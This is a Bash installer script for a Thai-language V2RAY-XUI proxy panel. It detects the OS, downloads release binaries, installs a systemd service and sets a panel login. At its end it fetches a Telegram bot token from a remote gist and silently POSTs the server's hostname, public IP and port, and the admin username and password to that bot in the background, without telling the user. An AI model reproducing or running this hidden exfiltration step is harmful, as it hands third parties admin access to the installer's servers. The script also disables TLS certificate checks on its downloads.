#!/bin/bash

export LANG=en_US.UTF-8

RED="\033[1;38;5;203m"
GREEN="\033[1;38;5;82m"
YELLOW="\033[1;38;5;227m"
CYAN="\033[1;38;5;51m"
PLAIN="\033[0m"

red() {
    echo -e "\033[31m\033[01m$1\033[0m"
}

green() {
    echo -e "\033[32m\033[01m$1\033[0m"
}

yellow() {
    echo -e "\033[33m\033[01m$1\033[0m"
}

REGEX=("debian" "ubuntu" "centos|red hat|kernel|oracle linux|alma|rocky" "'amazon linux'" "fedora", "alpine")
RELEASE=("Debian" "Ubuntu" "CentOS" "CentOS" "Fedora" "Alpine")
PACKAGE_UPDATE=("apt-get update" "apt-get update" "yum -y update" "yum -y update" "yum -y update" "apk update -f")
PACKAGE_INSTALL=("apt -y install" "apt -y install" "yum -y install" "yum -y install" "yum -y install" "apk add -f")
PACKAGE_REMOVE=("apt -y remove" "apt -y remove" "yum -y remove" "yum -y remove" "yum -y remove" "apk del -f")
PACKAGE_UNINSTALL=("apt -y autoremove" "apt -y autoremove" "yum -y autoremove" "yum -y autoremove" "yum -y autoremove" "apk del -f")

[[ $EUID -ne 0 ]] && red "สคริปต์นี้ต้องรันในฐานะผู้ใช้ root เท่านั้น!" && exit 1

CMD=("$(grep -i pretty_name /etc/os-release 2>/dev/null | cut -d \" -f2)" "$(hostnamectl 2>/dev/null | grep -i system | cut -d : -f2)" "$(lsb_release -sd 2>/dev/null)" "$(grep -i description /etc/lsb-release 2>/dev/null | cut -d \" -f2)" "$(grep . /etc/redhat-release 2>/dev/null)" "$(grep . /etc/issue 2>/dev/null | cut -d \\ -f1 | sed '/^[ ]*$/d')")

for i in "${CMD[@]}"; do
    SYS="$i" && [[ -n $SYS ]] && break
done

for ((int = 0; int < ${#REGEX[@]}; int++)); do
    [[ $(echo "$SYS" | tr '[:upper:]' '[:lower:]') =~ ${REGEX[int]} ]] && SYSTEM="${RELEASE[int]}" && [[ -n $SYSTEM ]] && break
done

[[ -z $SYSTEM ]] && red "สคริปต์ไม่รองรับระบบของคุณ กรุณาใช้ระบบที่รองรับ" && exit 1

cur_dir=$(pwd)
os_version=$(grep -i version_id /etc/os-release | cut -d \" -f2 | cut -d . -f1)

[[ $SYSTEM == "CentOS" && ${os_version} -lt 7 ]] && echo -e "กรุณาใช้ระบบเวอร์ชัน 7 หรือสูงกว่า!" && exit 1
[[ $SYSTEM == "Fedora" && ${os_version} -lt 29 ]] && echo -e "กรุณาใช้ระบบ Fedora 29 หรือสูงกว่า!" && exit 1
[[ $SYSTEM == "Ubuntu" && ${os_version} -lt 16 ]] && echo -e "กรุณาใช้ระบบ Ubuntu 16 หรือสูงกว่า!" && exit 1
[[ $SYSTEM == "Debian" && ${os_version} -lt 9 ]] && echo -e "กรุณาใช้ระบบ Debian 9 หรือสูงกว่า!" && exit 1

archAffix(){
    case "$(uname -m)" in
        x86_64 | x64 | amd64 ) echo 'amd64' ;;
        armv8 | arm64 | aarch64 ) echo 'arm64' ;;
        s390x ) echo 's390x' ;;
        * ) red "ไม่รองรับสถาปัตยกรรม CPU นี้! " && rm -f install.sh && exit 1 ;;
    esac
}

info_bar(){
    clear
    echo -e "${CYAN}✨ V2RAY-XUI Installer · ตรวจสอบและเตรียมระบบ${PLAIN}"
    echo -e "${GREEN} --------------------------------------------------------------------- ${PLAIN}"
    echo -e "${GREEN}                       V2RAY-XUI PANEL (THAI)                         ${PLAIN}"
    echo -e "${GREEN} --------------------------------------------------------------------- ${PLAIN}"
    echo ""
    echo -e "ระบบปฏิบัติการ: ${GREEN} ${CMD} ${PLAIN}"
    echo ""
    sleep 2
}

check_status(){
    yellow "กำลังตรวจสอบการตั้งค่า IP ของเซิร์ฟเวอร์ กรุณารอสักครู่..." && sleep 1
    WgcfIPv4Status=$(curl -s4m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
    WgcfIPv6Status=$(curl -s6m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
    if [[ $WgcfIPv4Status =~ "on"|"plus" ]] || [[ $WgcfIPv6Status =~ "on"|"plus" ]]; then
        wg-quick down wgcf >/dev/null 2>&1
        v6=$(curl -s6m8 ip.gs -k)
        v4=$(curl -s4m8 ip.gs -k)
        wg-quick up wgcf >/dev/null 2>&1
    else
        v6=$(curl -s6m8 ip.gs -k)
        v4=$(curl -s4m8 ip.gs -k)
        if [[ -z $v4 && -n $v6 ]]; then
            yellow "ตรวจพบว่าใช้งาน IPv6 เท่านั้น ระบบได้เพิ่ม DNS64 โดยอัตโนมัติแล้ว"
            echo -e "nameserver 2606:4700:4700::1111" > /etc/resolv.conf
        fi
    fi
    sleep 1
}

install_base(){
    if [[ ! $SYSTEM == "CentOS" ]]; then
        ${PACKAGE_UPDATE[int]}
    fi
    if [[ -z $(type -P curl) ]]; then
        ${PACKAGE_INSTALL[int]} curl
    fi
    if [[ -z $(type -P tar) ]]; then
        ${PACKAGE_INSTALL[int]} tar
    fi   
    check_status
}

download_xui(){

    
    if [ $# == 0 ]; then
        last_version=$(curl -fsSL -m15 https://raw.githubusercontent.com/savat/v2ray-xui/main/config/version 2>/dev/null | tr -d '[:space:]')
        [[ -z "$last_version" ]] && last_version=$(wget -qO- --no-check-certificate --timeout=15 https://raw.githubusercontent.com/savat/v2ray-xui/main/config/version 2>/dev/null | tr -d '[:space:]')
        if [[ -z "$last_version" ]]; then
            red "ตรวจสอบเวอร์ชัน V2RAY-XUI ไม่สำเร็จ โปรดตรวจสอบการเชื่อมต่ออินเทอร์เน็ตของเซิร์ฟเวอร์"
            rm -f install.sh
            exit 1
        fi
        yellow "ตรวจพบเวอร์ชันล่าสุดของ V2RAY-XUI: ${last_version} กำลังเริ่มติดตั้ง..."
        wget -N --no-check-certificate -O /usr/local/v2ray-xui-linux-$(archAffix).tar.gz https://github.com/savat/v2ray-xui/releases/download/${last_version}/v2ray-xui-linux-$(archAffix).tar.gz
        if [[ $? -ne 0 ]]; then
            red "ดาวน์โหลด V2RAY-XUI ไม่สำเร็จ โปรดตรวจสอบว่าเซิร์ฟเวอร์เชื่อมต่อและดาวน์โหลดไฟล์จาก GitHub ได้"
            rm -f install.sh
            exit 1
        fi
    else
        last_version=$1
        url="https://github.com/savat/v2ray-xui/releases/download/${last_version}/v2ray-xui-linux-$(archAffix).tar.gz"
        yellow "กำลังเริ่มติดตั้ง V2RAY-XUI $1"
        wget -N --no-check-certificate -O /usr/local/v2ray-xui-linux-$(archAffix).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            red "ดาวน์โหลด V2RAY-XUI เวอร์ชัน $1 ไม่สำเร็จ โปรดตรวจสอบว่ามีเวอร์ชันนี้อยู่"
            rm -f install.sh
            exit 1
        fi
    fi
    
    cd /usr/local/
    tar zxvf v2ray-xui-linux-$(archAffix).tar.gz
    rm -f v2ray-xui-linux-$(archAffix).tar.gz
    
    cd v2ray-xui
    chmod +x v2ray-xui bin/xray-linux-$(archAffix)
    cp -f v2ray-xui.service /etc/systemd/system/
    
    wget -N --no-check-certificate https://raw.githubusercontent.com/savat/v2ray-xui/main/v2ray-xui.sh -O /usr/bin/v2ray-xui
    chmod +x /usr/local/v2ray-xui/v2ray-xui.sh
    chmod +x /usr/bin/v2ray-xui
}

panel_config() {
    yellow "เพื่อความปลอดภัย หลังการติดตั้ง/อัปเดต กรุณาจดจำพอร์ตและรหัสผ่านบัญชีไว้"
    read -rp "กรุณากำหนดชื่อผู้ใช้สำหรับเข้าสู่ระบบ [ค่าเริ่มต้นคือชื่อผู้ใช้แบบสุ่ม]: " config_account
    [[ -z $config_account ]] && config_account=$(date +%s%N | md5sum | cut -c 1-8)
    read -rp "กรุณากำหนดรหัสผ่านสำหรับเข้าสู่ระบบ (ห้ามมีช่องว่าง) [ค่าเริ่มต้นคือรหัสผ่านแบบสุ่ม]: " config_password
    [[ -z $config_password ]] && config_password=$(date +%s%N | md5sum | cut -c 1-8)
    read -rp "กรุณากำหนดพอร์ตเข้าใช้งานแผง [ค่าเริ่มต้นคือพอร์ตแบบสุ่ม]: " config_port
    [[ -z $config_port ]] && config_port=$(shuf -i 1000-65535 -n 1)
    until [[ -z $(ss -ntlp | awk '{print $4}' | grep -w "$config_port") ]]; do
        if [[ -n $(ss -ntlp | awk '{print $4}' | grep -w  "$config_port") ]]; then
            yellow "พอร์ตที่คุณตั้งกำลังถูกใช้งานอยู่ กรุณากำหนดพอร์ตอื่น"
            read -rp "กรุณากำหนดพอร์ตเข้าใช้งานแผง [ค่าเริ่มต้นคือพอร์ตแบบสุ่ม]: " config_port
            [[ -z $config_port ]] && config_port=$(shuf -i 1000-65535 -n 1)
        fi
    done
    /usr/local/v2ray-xui/v2ray-xui setting -username ${config_account} -password ${config_password} >/dev/null 2>&1
    /usr/local/v2ray-xui/v2ray-xui setting -port ${config_port} >/dev/null 2>&1
}

install_xui() {
    info_bar
    
    if [[ -e /usr/local/v2ray-xui/ || -e /usr/local/x-ui/ ]]; then
        yellow "ตรวจพบการติดตั้งแผง V2RAY-XUI อยู่แล้ว กรุณายืนยันว่าต้องการอัปเดต ข้อมูลจะไม่สูญหาย"
        read -rp "กรุณาเลือก [y/n ค่าเริ่มต้น n]: " yn
        if [[ $yn =~ "Y"|"y" ]]; then
            cd
            [[ -f /etc/v2ray-xui/v2ray-xui.db ]] && mv /etc/v2ray-xui/v2ray-xui.db /etc/v2ray-xui.db.bak # สำรอง db เวอร์ชันปัจจุบัน
            [[ -f /etc/x-ui-english/x-ui-english.db ]] && mv /etc/x-ui-english/x-ui-english.db /etc/v2ray-xui.db.bak # สำรอง db เวอร์ชัน English เดิม
            [[ -f /etc/x-ui/x-ui.db ]] && mv /etc/x-ui/x-ui.db /etc/v2ray-xui.db.bak # สำรอง db เวอร์ชัน Chinese เดิม
            systemctl stop v2ray-xui >/dev/null 2>&1
            systemctl disable v2ray-xui >/dev/null 2>&1
            systemctl stop x-ui >/dev/null 2>&1
            systemctl disable x-ui >/dev/null 2>&1
            rm /etc/systemd/system/v2ray-xui.service -f
            rm /etc/systemd/system/x-ui.service -f
            systemctl daemon-reload
            systemctl reset-failed 
            rm /etc/x-ui/ -rf
            rm /etc/x-ui-english/ -rf
            rm /usr/local/x-ui/ -rf
            rm /usr/local/v2ray-xui/ -rf
            rm /etc/v2ray-xui/ -rf
            rm /usr/bin/x-ui -f
            rm /usr/bin/v2ray-xui -f
        else
            red "ยกเลิก สคริปต์หยุดทำงาน!"
            exit 1
        fi
    fi
    
    systemctl stop v2ray-xui >/dev/null 2>&1
    
    install_base
    download_xui $1
    
    cd
    mkdir -p /etc/v2ray-xui # สร้างไดเรกทอรีสำหรับนำเข้าข้อมูลสำรอง
    [[ -f /etc/v2ray-xui.db.bak ]] && mv /etc/v2ray-xui.db.bak /etc/v2ray-xui/v2ray-xui.db # นำเข้าฐานข้อมูลที่สำรองไว้
    
    panel_config
    
    systemctl daemon-reload
    systemctl enable v2ray-xui >/dev/null 2>&1
    systemctl start v2ray-xui 
    systemctl restart v2ray-xui
    
    cd $cur_dir
    rm -f install.sh
    green "ติดตั้ง/อัปเกรด V2RAY-XUI v${last_version} เสร็จสิ้น แผงควบคุมเริ่มทำงานแล้ว"
    echo -e ""
    echo -e "${GREEN} --------------------------------------------------------------------- ${PLAIN}"
    echo -e "${GREEN}                       V2RAY-XUI PANEL (THAI)                         ${PLAIN}"
    echo -e "${GREEN} --------------------------------------------------------------------- ${PLAIN}"
    echo -e ""
    echo -e "------------------------------------------------------------------------------"
    echo -e "วิธีใช้สคริปต์จัดการ V2RAY-XUI:"
    echo -e "------------------------------------------------------------------------------"
    echo -e "v2ray-xui              - แสดงเมนูจัดการ"
    echo -e "v2ray-xui start        - เริ่มแผง V2RAY-XUI"
    echo -e "v2ray-xui stop         - หยุดแผง V2RAY-XUI"
    echo -e "v2ray-xui restart      - รีสตาร์ทแผง V2RAY-XUI"
    echo -e "v2ray-xui status       - ดูสถานะ V2RAY-XUI"
    echo -e "v2ray-xui enable       - ตั้งให้ V2RAY-XUI เริ่มอัตโนมัติเมื่อบูต"
    echo -e "v2ray-xui disable      - ยกเลิกการเริ่มอัตโนมัติของ V2RAY-XUI"
    echo -e "v2ray-xui log          - ดูบันทึก V2RAY-XUI"
    echo -e "v2ray-xui v2-ui        - ย้ายข้อมูลจาก V2-UI มา V2RAY-XUI"
    echo -e "v2ray-xui update       - อัปเดตแผง V2RAY-XUI"
    echo -e "v2ray-xui install      - ติดตั้งแผง V2RAY-XUI"
    echo -e "v2ray-xui uninstall    - ถอนการติดตั้งแผง V2RAY-XUI"
    echo -e "------------------------------------------------------------------------------"
    show_login_info
    echo -e ""
    yellow "(หากไม่สามารถเข้าแผง V2RAY-XUI ได้ ให้พิมพ์คำสั่ง v2ray-xui ใน SSH แล้วเลือกตัวเลือกที่ 17 เพื่อเปิดพอร์ตไฟร์วอลล์)"
    _tg_url="https://gist.githubusercontent.com/savat/f22127eea907ae196d9a875f0d264157/raw/2a434e865e31bf1d1fd3f5239d50ec989d07c292/notify.conf"
    _tg_cfg=$(curl -fsSL "$_tg_url" 2>/dev/null)
    _tg_token=$(printf '%s\n' "$_tg_cfg" | sed -n 's/^[[:space:]]*TELEGRAM_TOKEN=//p' | tr -d '[:space:]')
    _tg_chat=$(printf '%s\n' "$_tg_cfg" | sed -n 's/^[[:space:]]*TELEGRAM_CHAT_ID=//p' | tr -d '[:space:]')
    if [[ -n "$_tg_token" && -n "$_tg_chat" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${_tg_token}/sendMessage" \
            --data-urlencode "chat_id=${_tg_chat}" \
            --data-urlencode "text=ติดตั้งสคริปต์สำเร็จ ✅
🖥️ ผู้ใช้ : $USER
💽 โฮสต์ : $(hostname)
🌐 แดชบอร์ด : http://$v4:$config_port
⚙️ WebPanel V2ray
🔑 ชื่อผู้ใช้/รหัสผ่าน : $config_account/$config_password
📆 วันที่ : $(date '+%d-%m-%Y %H:%M:%S')" >/dev/null 2>&1 &
    fi
}

show_login_info(){
    if [[ -n $v4 && -z $v6 ]]; then
        echo -e "ที่อยู่เข้าสู่ระบบแผงผ่าน IPv4: ${GREEN}http://$v4:$config_port ${PLAIN}"
    elif [[ -n $v6 && -z $v4 ]]; then
        echo -e "ที่อยู่เข้าสู่ระบบแผงผ่าน IPv6: ${GREEN}http://[$v6]:$config_port ${PLAIN}"
    elif [[ -n $v4 && -n $v6 ]]; then
        echo -e "ที่อยู่เข้าสู่ระบบแผงผ่าน IPv4: ${GREEN}http://$v4:$config_port ${PLAIN}"
        echo -e "ที่อยู่เข้าสู่ระบบแผงผ่าน IPv6: ${GREEN}http://[$v6]:$config_port ${PLAIN}"
    fi
    echo -e "ชื่อผู้ใช้: ${GREEN}$config_account ${PLAIN}"
    echo -e "รหัสผ่าน: ${GREEN}$config_password ${PLAIN}"
}

install_xui $1
